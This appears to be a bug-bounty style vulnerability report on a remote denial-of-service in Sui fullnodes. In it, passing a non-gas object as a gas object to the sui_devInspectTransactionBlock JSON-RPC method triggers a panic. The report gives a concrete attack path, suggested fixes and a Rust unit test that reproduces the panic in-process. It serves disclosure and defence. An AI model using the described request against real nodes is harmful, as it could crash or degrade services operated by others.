Remote node crash

Remote DoS via `sui_devInspectTransactionBlock` (panic in gas smashing)
Created on January 27, 2026

Target
https://github.com/MystenLabs/sui/tree/testnet/crates/sui-core 
Protocol
Vulnerability details
File Location

crates/sui-core/src/authority.rs Lines 2711-2731
crates/sui-transaction-checks/src/lib.rs Lines 157-193
sui-execution/latest/sui-adapter/src/gas_charger.rs Lines 154-194
sui-execution/latest/sui-adapter/src/execution_engine.rs Line 337
Description
sui_devInspectTransactionBlock allows the caller to provide additionalArgs.gasObjects (gas payment object refs). In the default dev-inspect configuration, the fullnode accepts these refs without validating that they are gas coins. During execution, the gas subsystem assumes the provided payment objects are gas coins and contains panic paths for invariant violations. As a result, a remote caller can trigger a panic by passing any existing non-gas object as a “gas object”.
Depending on build/runtime configuration (e.g., panic=abort vs unwind) and how the JSON-RPC runtime handles panics, this can:
Crash the process (worst case), or
Kill the handler task / worker thread repeatedly (degraded availability).

Attack Path (high level)
Entry point: JSON-RPC method sui_devInspectTransactionBlock (Write API).
Precondition: Fullnode exposes JSON-RPC publicly (default bind is 0.0.0.0:9000 unless overridden).
Exploit:
Caller sets additionalArgs.skipChecks=true (or omits it; server defaults skip_checks to true).
Caller supplies at least one existing on-chain non-gas object in additionalArgs.gasObjects (e.g., a package object ref, NFT object ref, etc.).
Execution reaches gas handling (GasCharger::smash_gas and/or later gas mutation), which can panic! on non-gas inputs.

Root cause (code-level)
AuthorityState::dev_inspect_transaction_block defaults:
skip_checks = skip_checks.unwrap_or(true) and uses check_dev_inspect_input when true.
check_dev_inspect_input explicitly “bypasses many of the normal object checks” and does not verify gas objects are gas coins.
Execution gas logic assumes payment objects are valid gas coins and includes explicit panic! paths:
GasCharger::smash_gas panics on non-gas objects when smashing multiple payment coins.
Additional panic paths exist when later mutating/deducting gas from an object that is not a Move coin.
Mitigation (recommended fixes)
Implement at least one of the following; combining them is defense-in-depth:

Remove panics on user-controlled input in gas handling

Refactor GasCharger::smash_gas to return Result<(), ExecutionError> instead of panicking.
Propagate the error back up and return a normal execution failure for dev-inspect.
Validate gasObjects on dev-inspect

In the skip_checks=true dev-inspect branch, validate every payment object is a Data::Move object whose MoveObjectType is a gas coin.
Alternatively, ignore user-provided gasObjects for dev-inspect and always use a dummy gas coin.
Harden RPC exposure

Do not expose sui_devInspectTransactionBlock publicly by default, or require explicit operator opt-in.
Add an authN/authZ layer (or IP allow-listing policy) for dev-inspect endpoints.
Validation steps
Proof of code (regression tests)
This repo now contains in-process proof tests that demonstrate the panic condition deterministically.

1) Runnable PoV test
This unit test directly demonstrates the invariant panic in the gas layer by supplying a non-gas Move object as a “gas coin”:

rust
Copy
 
 #[cfg(test)]
    mod tests {
        use super::*;
        use move_core_types::identifier::Identifier;
        use move_core_types::language_storage::StructTag;
        use sui_protocol_config::ProtocolConfig;
        use sui_types::base_types::ObjectID;
        use sui_types::digests::TransactionDigest;
        use sui_types::in_memory_storage::InMemoryStorage;
        use sui_types::object::{MoveObject, OBJECT_START_VERSION, Object, Owner};
        use sui_types::transaction::{InputObjectKind, ObjectReadResult, InputObjects};
        use sui_types::SUI_FRAMEWORK_ADDRESS;

        /// Proof-of-vulnerability (in-process):
        /// `GasCharger::smash_gas` panics if any "gas coin" input is not actually a gas coin.
        ///
        /// This is the same panic that can be reached from dev-inspect if user-provided gas objects
        /// are not validated as gas coins.
        #[test]
        #[should_panic(expected = "Invariant violation: non-gas coin object as input for gas in txn")]
        fn test_smash_gas_panics_on_non_gas_payment_object() {
            let protocol_config = ProtocolConfig::get_for_min_version();
            let tx_digest = TransactionDigest::genesis_marker();
            let owner = SuiAddress::random_for_testing_only();

            let gas_id = ObjectID::random();
            let gas_object = Object::with_id_owner_for_testing(gas_id, owner);
            let gas_ref = gas_object.compute_object_reference();

            // Construct a non-gas Move object (any non-coin type works).
            let bad_id = ObjectID::random();
            let struct_tag = StructTag {
                address: SUI_FRAMEWORK_ADDRESS,
                module: Identifier::new("not_coin").unwrap(),
                name: Identifier::new("NotCoin").unwrap(),
                type_params: vec![],
            };
            let mut contents = bad_id.to_vec();
            contents.push(0); // ensure >= 32 bytes; contents are otherwise irrelevant for this test
            let bad_move_obj = unsafe {
                MoveObject::new_from_execution_with_limit(
                    struct_tag.into(),
                    /* has_public_transfer */ true,
                    OBJECT_START_VERSION,
                    contents,
                    256,
                )
                .unwrap()
            };
            let bad_object = Object::new_move(
                bad_move_obj,
                Owner::AddressOwner(owner),
                TransactionDigest::genesis_marker(),
            );
            let bad_ref = bad_object.compute_object_reference();

            let store = InMemoryStorage::new(vec![gas_object.clone(), bad_object.clone()]);

            let input_objects: InputObjects = vec![
                ObjectReadResult::new(
                    InputObjectKind::ImmOrOwnedMoveObject(gas_ref),
                    gas_object.clone().into(),
                ),
                ObjectReadResult::new(
                    InputObjectKind::ImmOrOwnedMoveObject(bad_ref),
                    bad_object.clone().into(),
                ),
            ]
            .into();

            let mut temporary_store = TemporaryStore::new(
                &store,
                input_objects,
                vec![],
                tx_digest,
                &protocol_config,
                /* cur_epoch */ 0,
            );

            let mut gas_charger = GasCharger::new(
                tx_digest,
                PaymentMethod::Coins(vec![gas_ref, bad_ref]),
                SuiGasStatus::new_unmetered(),
                &protocol_config,
            );

            gas_charger.smash_gas(&mut temporary_store);
        }
    }
}
